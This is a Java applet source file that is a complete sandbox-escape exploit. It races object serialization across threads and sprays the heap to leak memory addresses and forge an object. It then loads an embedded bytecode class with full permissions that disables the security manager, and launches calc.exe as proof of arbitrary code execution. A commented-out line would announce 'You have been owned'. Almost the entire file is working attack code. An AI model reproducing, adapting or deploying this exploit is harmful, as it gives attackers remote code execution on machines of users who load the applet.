import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamConstants;
import java.io.OutputStream;
import java.io.Serializable;
import java.security.AllPermission;
import java.security.PermissionCollection;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.util.Arrays;
import java.util.Random;
import java.util.concurrent.*;
import java.applet.*;
import java.lang.reflect.*;


public class Ser2 extends Applet {

  private static enum ARCH {
    OOPS64(2), OOPS64WEIRD(16), ARCH32(12);
    public final int array_base_object_offset;
    
    ARCH(int abo) {
      array_base_object_offset = abo;
    }
  }
  
  private static ARCH arch = ARCH.OOPS64;
  private static final int MAGIC = 0xDEADBEEF;
  private static volatile boolean disabled = false;
    
  private static class MagicIndex {
    private byte[] byteArray;
    private int magicIndex;

    public MagicIndex(byte[] result, int index) {
      this.magicIndex = index;
      this.byteArray = result;
    }
  }
  private static class ThreadOutputStream extends OutputStream {
    private ByteArrayOutputStream lhs;
    private ByteArrayOutputStream rhs;
    private Thread thread;
    private int count;
    private CountDownLatch start;
    private int targetCount;
    
    public ThreadOutputStream(Thread thread) {
      this.thread = thread;
      this.targetCount = targetCount;
      this.lhs = new ByteArrayOutputStream();
      this.rhs = new ByteArrayOutputStream();
    }

    public void reset(int targetCount, CountDownLatch start) {
      this.targetCount = targetCount;
      this.count = 0;
      this.start = start;
      this.lhs.reset();
      this.rhs.reset();
    }

    @Override
    public void write(int b) throws IOException {
      if (Thread.currentThread() == thread) {
        lhs.write(b);
      } else {
        rhs.write(b);
        ++count;
        
        if (count == targetCount) {
          
          start.countDown();
        }
      }
      
    }
    
    public MagicIndex findMagic() {
      MagicIndex lhs = findMagic(this.lhs.toByteArray());
      if (lhs != null) {
        return lhs;
      }

      return findMagic(rhs.toByteArray());
    }

    private MagicIndex findMagic(byte[] result) {
      int idx = Ser2.findMagic(result);
      if (idx >= 0) {
        return new MagicIndex(result, idx);
      } else {
        return null;
      }
    }
    public int getCount() {
      return count;
    }
    
  }
    private static class EvilClassLoader extends ClassLoader {
        public static Class f(EvilClassLoader l, String name, byte[] bytes, ProtectionDomain domain) {
                return l.defineClass(name, bytes, 0, bytes.length, domain);
        }
    }
    
  public static class FakeMe implements Serializable {
    private int magic = MAGIC;
    private EvilClassLoader o;
    
    private void writeObject(ObjectOutputStream oos) throws Exception {
      System.out.println("FAKEME!");
      if (o != null) {
                PermissionCollection collection = new Permissions();
                collection.add(new AllPermission());

                ProtectionDomain domain = new ProtectionDomain(null, collection);
                Class clz = EvilClassLoader.f(o, "Evil", EVIL_CLASS, domain);
                clz.getMethod("disable").invoke(null);
                disabled = true;
      }
    }
  }
  
  public static class EatMe implements Serializable {
    private static CountDownLatch start = new CountDownLatch(1);
    
    private void writeObject(final ObjectOutputStream oos) throws Exception {
      final CountDownLatch latch = new CountDownLatch(1);
      
      Thread th = new Thread(new Runnable() {

        @Override
        public void run() {
          try {
            oos.writeObject(new ClassCatcher(latch));
          } catch (Throwable th) {
            // ignore
          }
          
        }
        
      });
      th.start();
      try {
        start.await();
        oos.defaultWriteObject();
      } finally {
        latch.countDown();
      }
      try {
        th.join();
      } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
      }
    }
  }
  
  public static class ShadowObject implements Serializable {
    private Object shadowed;
    private transient CountDownLatch latch;
    
    public ShadowObject(CountDownLatch latch) {
      this.latch = latch;
    }
    
    private void writeObject(ObjectOutputStream oos) {
      if (shadowed != null) {
        System.out.println("shadowed: " + shadowed);
      }
      
      try {
        latch.await();
      } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
      }
    }
  }
  
  public static class ShadowInt implements Serializable {
    private int magic;
    private int s1;
    private int s2;
    
    private transient CountDownLatch latch;
    
    public ShadowInt(CountDownLatch latch) {
      this.latch = latch;
    }
    
    private void writeObject(ObjectOutputStream oos) {
      try {
        latch.await();
      } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
      }
    }
  }
  
  public static class ClassCatcher implements Serializable {
    private transient CountDownLatch latch;

    private int s1;
    private int s2;
    private int s3;
    private int s4;
    private int s5;
    private int s6;
    private int s7;
    private int s8;
    private int s9;
    private int s10;

    
    private int s11;
    private int s12;
    private int s13;
    private int s14;
    private int s15;
    private int s16;
    private int s17;
    private int s18;
    private int s19;
    private int s20;

    private int s21;
    private int s22;
    private int s23;
    private int s24;
    private int s25;
    private int s26;
    private int s27;
    private int s28;
    private int s29;
    private int s30;

    private int s31;
    private int s32;
    private int s33;
    private int s34;
    private int s35;
    private int s36;
    private int s37;
    private int s38;
    private int s39;
    private int s40;

    private int s41;
    private int s42;
    private int s43;
    private int s44;
    private int s45;
    private int s46;
    private int s47;
    private int s48;
    private int s49;
    private int s50;
    
    public ClassCatcher(CountDownLatch latch) {
      this.latch = latch;
    }
    
    private void writeObject(ObjectOutputStream oos) {
      try {
        latch.await();
      } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
      }
    }
  }
  

  public static class IntHolder implements Serializable {
    public static CountDownLatch start;
    
    private transient int object;
    
    public IntHolder(int o) {
      this.object = o;
    }
    
    /**
     * 
     */
    private static final long serialVersionUID = 1L;
  
    private void writeObject(final ObjectOutputStream oos) throws Exception {
      
      final CountDownLatch latch = new CountDownLatch(1);
      
      Thread th = new Thread(new Runnable() {

        @Override
        public void run() {
          try {
            oos.writeObject(new ShadowObject(latch));
          } catch (Throwable th) {
            // ignore
          }
          
        }
        
      });
      th.start();
      try {
        start.await();
        oos.defaultWriteObject();
      } finally {
        latch.countDown();
      }
      try {
        th.join();
      } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
      }
      
    }
  }
  
  
  public static class ObjectHolder implements Serializable {
    private static CountDownLatch start;
    
    private transient int magic = MAGIC;
    private transient Object o1;
    private transient Object o2;
    
    public ObjectHolder(Object o1, Object o2) {
      this.o1 = o1;
      this.o2 = o2;
    }
    
    /**
     * 
     */
    private static final long serialVersionUID = 1L;
  
    private void writeObject(final ObjectOutputStream oos) throws Exception {
      
      final CountDownLatch latch = new CountDownLatch(1);
      
      Thread th = new Thread(new Runnable() {

        @Override
        public void run() {
          try {
            oos.writeObject(new ShadowInt(latch));
          } catch (Throwable th) {
            // ignore
          }
          
        }
        
      });
      th.start();
      try {
        start.await();
        oos.defaultWriteObject();
      } finally {
        latch.countDown();
      }
      try {
        th.join();
      } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
      }
      
    }
  }
  
  public static void readObject(int address) {
    ThreadOutputStream tos = new ThreadOutputStream(Thread.currentThread());
    final Random r = new Random();
    final IntHolder intHolder = new IntHolder(address);
    for (int i = 0 ; i < 100000; ++i) {
      if (i % 1000 == 0) {
        System.out.println("readObject:" + i);
        /*try {
          Thread.sleep(500);
        } catch (InterruptedException e) {
          e.printStackTrace();
        }*/
      }
      try {

        IntHolder.start = new CountDownLatch(1);
        tos.reset(27 + r.nextInt(40), IntHolder.start);
        ObjectOutputStream oos = new ObjectOutputStream(tos);
        oos.writeObject(intHolder);
        if (Ser2.disabled) {
          return;
        }

      } catch (Throwable th) {
        //th.printStackTrace();
        //ignore;
        
      }
          
    }   
  }
  
  private static int toInt(byte[] result, int offset) {
    int r4 = result[offset];
    int r3 = result[offset + 1];
    int r2 = result[offset + 2];
    int r1 = result[offset + 3];
    
    
    int address = ((r4 & 0xFF) << 24) | ((r3 & 0xFF) << 16) | ((r2 & 0xFF) << 8) | (r1 & 0xFF); 
    return address;
  }

  public static int readClassAddress() throws Exception {


    Random r = new Random();
    Object[] spray = new Object[500];

    
    ThreadOutputStream tos = new ThreadOutputStream(Thread.currentThread());
    
    for (int i = 0 ; i < 100000; ++i) {
      if (i % 1000 == 0) {
        System.out.println("readclassaddress:" + i);
        /*System.gc();
        Thread.sleep(500);*/
      }
      try {

        EatMe.start = new CountDownLatch(1);
        int n = r.nextInt(40) + 286;
        tos.reset(n, EatMe.start);

        ObjectOutputStream oos = new ObjectOutputStream(tos);
        

        System.gc();
        final EatMe eatMe = new EatMe();
        
        for (int j = 0; j < spray.length; ++j) {
          spray[j] = new FakeMe();

        }
        
        oos.writeObject(eatMe);



        MagicIndex index = tos.findMagic();

        if (index != null) {

          byte[] result = index.byteArray;
          int magicIndex = index.magicIndex;
          System.out.println("found magic with: " + result.length + "/" + tos.count + "/" + n);
          int address = toInt(result, magicIndex - 4);

          
          return address;
          
            
        }

      } catch (Throwable th) {
        //th.printStackTrace();
        //ignore;
      }
          
    } 
    
    throw new RuntimeException("failed");
  }
  
  private static int findMagic(byte[] result) {
    for (int i = 0; i < result.length - 3; ++i) {
      if ((result[i] & 0xFF) == 0xDE && (result[i + 1] & 0xFF) == 0xAD && (result[i + 2] & 0xFF) == 0xBE && (result[i + 3] & 0xFF) == 0xEF) {
        return i;
      }
    }
    
    return -1;
  }

  public static int[] readAddress(Object o1, Object o2) {
    final ByteArrayOutputStream bos = new ByteArrayOutputStream();

    ThreadOutputStream tos = new ThreadOutputStream(Thread.currentThread());
    final Random r = new Random();
    final ObjectHolder holder = new ObjectHolder(o1, o2);
    for (int i = 0 ; i < 100000; ++i) {

      try {
        bos.reset();

        ObjectHolder.start = new CountDownLatch(1);
        int n = 1 + r.nextInt(44);
        tos.reset(n, ObjectHolder.start);
        ObjectOutputStream oos = new ObjectOutputStream(tos);
        oos.writeObject(holder);

        if (i % 1000 == 0) {
          System.out.println("readaddress:" + i + "/" + bos.size());
        }

        MagicIndex idx = tos.findMagic();

        if (idx != null) {

          byte[] result = idx.byteArray;
          int magicIndex = idx.magicIndex;
          System.out.println("found magic with: " + magicIndex + "/" + tos.count + "/" + n);
          int address2 = toInt(result, magicIndex + 8);
          int address1 = toInt(result, magicIndex + 4);
          
          return new int[]{address1, address2};
        }

      } catch (Throwable th) {
        //th.printStackTrace();
        //ignore;
      }
          
    } 
    
    throw new RuntimeException("failed");
  
  }

  public static void main(String[] args) {
    new Ser2().init();
  }

  public void init() {
    try {
      System.out.println("cores: " + Runtime.getRuntime().availableProcessors());
      disableSecurity();
      try {
        //ProcessBuilder builder = new ProcessBuilder("/bin/bash", "-c", "osascript -e 'set volume 10' && say -v 'Hysterical' 'Ha Ha Ha Ha Ha' && say -v 'Zarvox' 'You have been owned. Java Applets are vulnerable to remote code execution'");
        //builder.start();
      } catch (Exception e) {
        e.printStackTrace();
      }

      try {
        ProcessBuilder builder = new ProcessBuilder("calc.exe");
        builder.start();
      } catch (Exception e) {
        e.printStackTrace();
      }


    } catch (Exception e) {
      throw new RuntimeException(e);
    }
  } 
  public static void disableSecurity() throws Exception {

  
    /* from my testing it seems osx compressed oops expand
     * the address by left shifting it by 3.
     * however, on linux compresssed oops does not expand
     * the address which is really weird because i'm not
     * sure how it can address 4 billion objects...
     */ 
    if (System.getProperty("os.arch").indexOf("64") >= 0) {
     if (System.getProperty("os.name").indexOf("Linux") >= 0 || 
         System.getProperty("os.name").indexOf("Windows") >= 0) {
       arch = ARCH.OOPS64WEIRD;
     } else {
       arch = ARCH.OOPS64;
     }
    } else {
     arch = ARCH.ARCH32;
    } 
 
    System.out.println("using arch: " + arch);

    ClassLoader classLoader = Ser2.class.getClassLoader();
  
    System.gc();
    Thread.sleep(1000);
    
    int classAddress = readClassAddress();

    System.out.println("got class address: " + classAddress);
    
    FakeMe fakeMe = new FakeMe();


    int[] fakeObject = new int[40];

    for (int i = 0; i < 10000; ++i) {
      byte[] bytes = new byte[1024];
      //load junk to move fakeObject/classLoader into next generation
    }

    System.out.println("moving into another generation...");
    System.gc();

    int[] adddresses =  readAddress(classLoader, fakeObject);
    
    System.out.println("found addresses: " + Arrays.toString(adddresses));
    

    if (arch == ARCH.OOPS64 || arch == ARCH.OOPS64WEIRD) {
      fakeObject[0] = 1;
      fakeObject[1] = 0;
      fakeObject[2] = classAddress;
      fakeObject[3] = 0;
      fakeObject[4] = adddresses[0];
    } else if (arch == ARCH.ARCH32) {
      fakeObject[0] = 1;
      fakeObject[1] = classAddress;
      fakeObject[2] = 0;
      fakeObject[3] = adddresses[0];

    } else {
      throw new IllegalStateException();
    }
 
   IntHolder holder = new IntHolder(adddresses[1] + arch.array_base_object_offset);

        
    readObject(adddresses[1] + arch.array_base_object_offset); // with oops everything is left shifted by 3
    
    System.out.println(System.getProperty("user.home"));

      

    
  }
  
    private static final byte[] EVIL_CLASS = new byte[]{
        -54, -2, -70, -66, 0, 0, 0, 50, 0, 46, 7, 0, 2, 1, 0, 4, 69, 118, 105, 108, 7, 0, 4, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 7, 0, 6, 1, 0, 30, 106, 97, 118, 97, 47, 115, 101, 99, 117, 114, 105, 116, 121, 47, 80, 114, 105, 118, 105, 108, 101, 103, 101, 100, 65, 99, 116, 105, 111, 110, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 10, 0, 3, 0, 11, 12, 0, 7, 0, 8, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 6, 76, 69, 118, 105, 108, 59, 1, 0, 7, 100, 105, 115, 97, 98, 108, 101, 10, 0, 1, 0, 11, 10, 0, 19, 0, 21, 7, 0, 20, 1, 0, 30, 106, 97, 118, 97, 47, 115, 101, 99, 117, 114, 105, 116, 121, 47, 65, 99, 99, 101, 115, 115, 67, 111, 110, 116, 114, 111, 108, 108, 101, 114, 12, 0, 22, 0, 23, 1, 0, 12, 100, 111, 80, 114, 105, 118, 105, 108, 101, 103, 101, 100, 1, 0, 52, 40, 76, 106, 97, 118, 97, 47, 115, 101, 99, 117, 114, 105, 116, 121, 47, 80, 114, 105, 118, 105, 108, 101, 103, 101, 100, 65, 99, 116, 105, 111, 110, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 1, 0, 3, 114, 117, 110, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 10, 0, 27, 0, 29, 7, 0, 28, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 12, 0, 30, 0, 31, 1, 0, 18, 115, 101, 116, 83, 101, 99, 117, 114, 105, 116, 121, 77, 97, 110, 97, 103, 101, 114, 1, 0, 30, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 101, 99, 117, 114, 105, 116, 121, 77, 97, 110, 97, 103, 101, 114, 59, 41, 86, 9, 0, 27, 0, 33, 12, 0, 34, 0, 35, 1, 0, 3, 111, 117, 116, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 59, 8, 0, 37, 1, 0, 25, 100, 105, 115, 97, 98, 108, 101, 100, 32, 115, 101, 99, 117, 114, 105, 116, 121, 32, 109, 97, 110, 97, 103, 101, 114, 10, 0, 39, 0, 41, 7, 0, 40, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 12, 0, 42, 0, 43, 1, 0, 7, 112, 114, 105, 110, 116, 108, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 69, 118, 105, 108, 46, 106, 97, 118, 97, 0, 33, 0, 1, 0, 3, 0, 1, 0, 5, 0, 0, 0, 3, 0, 1, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 10, -79, 0, 0, 0, 2, 0, 12, 0, 0, 0, 6, 0, 1, 0, 0, 0, 5, 0, 13, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 14, 0, 15, 0, 0, 0, 9, 0, 16, 0, 8, 0, 1, 0, 9, 0, 0, 0, 48, 0, 2, 0, 0, 0, 0, 0, 12, -69, 0, 1, 89, -73, 0, 17, -72, 0, 18, 87, -79, 0, 0, 0, 2, 0, 12, 0, 0, 0, 10, 0, 2, 0, 0, 0, 8, 0, 11, 0, 9, 0, 13, 0, 0, 0, 2, 0, 0, 0, 1, 0, 24, 0, 25, 0, 1, 0, 9, 0, 0, 0, 64, 0, 2, 0, 1, 0, 0, 0, 14, 1, -72, 0, 26, -78, 0, 32, 18, 36, -74, 0, 38, 1, -80, 0, 0, 0, 2, 0, 12, 0, 0, 0, 14, 0, 3, 0, 0, 0, 13, 0, 4, 0, 14, 0, 12, 0, 15, 0, 13, 0, 0, 0, 12, 0, 1, 0, 0, 0, 14, 0, 14, 0, 15, 0, 0, 0, 1, 0, 44, 0, 0, 0, 2, 0, 45

    };
}

